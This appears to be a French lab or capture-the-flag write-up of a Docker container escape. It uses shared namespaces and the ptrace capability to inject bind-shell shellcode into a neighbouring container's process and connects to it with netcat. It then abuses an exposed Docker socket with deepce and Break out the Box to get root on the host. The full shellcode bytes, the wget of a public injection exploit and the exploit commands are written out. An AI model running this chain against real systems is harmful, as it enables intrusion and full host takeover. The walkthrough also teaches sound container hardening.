## Container Lateral Escapce


On peut voir que le container `dns_proxy_server` est paramétré pour partager son PID Namespace avec le container `gitlab`. Les processus des 2 containers sont donc visibles par l'un ou l'autre. 

```bash
dexter@Lab:/opt$ cat dps/docker-compose.yml 
version: '3'
services:
    dps:
      image: dns_proxy_server
      environment:
        - MG_REGISTER_CONTAINER_NAMES=1
      volumes:
        - /var/run/docker.sock:/var/run/docker.sock
      pid: container:gitlab
      command: "/app/dns-proxy-server"
      networks:
        - dps
networks:
  dps:
    external: true

```



On peut aussi voir dans le docker-compose du container `dps` la commande lancée lors du démarrage du container : 

```bash
root@gitlab:/# ps aux | grep "/[a]pp/"
root       1801  0.0  0.2 627820  4064 ?        Ssl  07:03   0:00 /app/dns-proxy-server /app/dns-proxy-server
```
Voici les différents namespaces du container gitlab : 

```bash
root@gitlab:/# ll /proc/self/ns/
total 0
dr-x--x--x 2 root root 0 Jun 28 08:08 ./
dr-xr-xr-x 9 root root 0 Jun 28 08:08 ../
lrwxrwxrwx 1 root root 0 Jun 28 08:08 cgroup -> cgroup:[4026531835]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 ipc -> ipc:[4026532554]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 mnt -> mnt:[4026532552]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 net -> net:[4026532556]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 pid -> pid:[4026531836]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 pid_for_children -> pid:[4026531836]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 user -> user:[4026531837]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 uts -> uts:[4026532553]

```

Et les namespaces du container dps : 

```bash
root@gitlab:/# ll /proc/1801/ns
total 0
dr-x--x--x 2 root root 0 Jun 28 08:09 ./
dr-xr-xr-x 9 root root 0 Jun 28 07:45 ../
lrwxrwxrwx 1 root root 0 Jun 28 08:09 cgroup -> cgroup:[4026531835]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 ipc -> ipc:[4026532616]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 mnt -> mnt:[4026532614]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 net -> net:[4026532618]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 pid -> pid:[4026531836]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 pid_for_children -> pid:[4026531836]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 user -> user:[4026531837]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 uts -> uts:[4026532615]
```

On peut voir qu'en plus de partager le namespace PID ils partagent aussi le namespace users. Ce qui veut dire que root sur container gitlab sera aussi root sur le container dps.

Le docker-compose de gitlab nous montre une capabilities qui n'est pas par défaut lors de la création d'un container : ptrace. 

Ceci est confirmé dans le container : 

```bash
root@gitlab:/tmp# capsh --print | grep ptrace
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
```

La combinaison de ces 2 mauvaises pratiques/configuration va nous permettre de réaliser une injection de code au sein d'un processus. 

Voici un article sur l'injection de code dans un process running : [https://0x00sec.org/t/linux-infecting-running-processes/1097](https://0x00sec.org/t/linux-infecting-running-processes/1097) qui explique et propose un POC. 

Ce qu'il faut retenir c'est que tout les programmes de debug utilisent la capabilitie `ptrace`. Cette dernière permet de s'attacher à un process et de le modifier. 


### Exploit Process Injection 

```bash
root@gitlab:/dev/shm# wget https://raw.githubusercontent.com/0x00pf/0x00sec_code/master/mem_inject/infect.c

```

On remplace dans l'exploit le shellcode pour y mettre un bind sur le port 5600 (Comme ça on maitrise le paramètre du Reverse Shell dans l'exploit)

ShellCode : [https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)

Il faut remplacer dans l'exploit `infect.c` : 

```bash 

#define SHELLCODE_SIZE 32

unsigned char *shellcode =
  "\x48\x31\xc0\x48\x89\xc2\x48\x89"
  "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
  "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
  "\x2f\x73\x68\x00\xcc\x90\x90\x90";
```

par 


```bash 

#define SHELLCODE_SIZE 87

unsigned char *shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";
```

```bash
apt update && apt install gcc
root@gitlab:/dev/shm# gcc infect.c -o /tmp/infect
root@gitlab:/tmp# ./infect 
Usage:
        ./infect pid

root@gitlab:/tmp# ./infect 1801
+ Tracing process 1801
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x45c7e0
+ Setting instruction pointer to 0x45c7e2
+ Run it!
```

Le processus a bien été infecté par l'exploit. Le code malveillant ajouté au processus permet de spawn un Revershell sur le port 5600. 
Il faut maintenant trouver l'ip du container `dps`. 

Le container `gitlab` sur lequel on se trouve actuellement et le container `dps` sont sur le même network docker comme vu dans leur docker-compose. Notre user `dexter` n'a pas la permission de lancer de commande docker. Il va falloir trouver l'ip manuellement à partir du container. 

```bash 
root@gitlab:/tmp# hostname -i
172.19.0.2
``` 

On part du principe que le container `dps` sera en `172.19.0.3`
Pour se connecter à ce container on utilise netcat (qu'il faut installer comme gcc).

```bash 
root@gitlab:/tmp# nc 172.19.0.3 5600
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@448e6b22790a:/app# 
```

Une fois root sur le container `dps` il va falloir s'échapper de ce container pour arriver root sur l'host. 

## Container Breakout 

Lors de l'énumération avec le compte `dexter` on a pu avoir accès en lecture sur les docker-compose. 
On s'est rendu compte que le socket docker était exposé dans le container `dps`.
Ce partage de socket est une vulnérabilité et ne dois absolument pas être fait ou alors dans des conditions bien précises .

Nous allons l'utilisé pour passer accéder au FS entier de l'host. 

On peut faire ça à la main ou alors utiliser [deepce](https://github.com/stealthcopter/deepce). 
DeepCE est un script d'énumération docker (Comme un Linpeas/LinEnum).

Pensez à installer curl pour exploiter le socket docker.

On ne pourr pas monter de Reverse Shell sur notre Kali car les container n'ont pas d'accès direct au LAN.


```bash
oot@448e6b22790a:/app# ./deepce.sh                                                                                                                                                    [18/18]

                      ##         .                                                             
                ## ## ##        ==                                                             
             ## ## ## ##       ===           
         /"""""""""""""""""\___/ ===                                                           
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
         \______ X           __/ 
           \    \         __/
            \____\_______/
          __
     ____/ /__  ___  ____  ________                                                            
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE               
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/                                                                           
                                               
 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter                 
                                               
==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check        
[+] Negative Test ........... No 
[+] Multi line test ......... Yes                              

===================================( Enumerating Platform )===================================                                                                                                [+] Inside Container ........ Yes
[+] Container Platform ...... docker                                                           
[+] Container tools ......... None
[+] User .................... root
[+] Groups .................. root                                                             
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Yes                                                              
srw-rw---- 1 root 998 0 Jun 28 07:00 /var/run/docker.sock
[+] Sock is writable ........ Yes                                                              
The docker sock is writable, we should be able to enumerate docker, create containers 
and obtain root privs on the host machine
See https://stealthcopter.github.io/deepce/guides/docker-sock.md      
```


DeepCE nous a montré qu'un SOCKET été en lecture/écriture. Nous allons utiliser [Break out the Box](https://github.com/brompwnie/botb) pour sortir du container. 

Go étant un peu lourd à installer nous allons passer par la release direct : 
[https://github.com/brompwnie/botb/releases](https://github.com/brompwnie/botb/releases)

```
root@448e6b22790a:/tmp# ./botb-linux-amd64 -autopwn                                                                                                                                      [6/6]
[+] Break Out The Box                                                                                                                                                                         
[+] Attempting to autopwn                                                                      
[+] Hunting Docker Socks
[+] Attempting to autopwn:  /run/docker.sock                                                                                                                                                  
[+] Attempting to escape to host...                                                                                                                                                           
[+] Attempting in TTY Mode
```

Ce que fait BotB est simple, il installe docker via les sources officielles, et ensuite en utilisant le socket docker présent sur l'hôte il créer un container en lui montant le FS de l'hôte comme volume sur le nouveau container crée. 




Voilà Root sur l'host. 
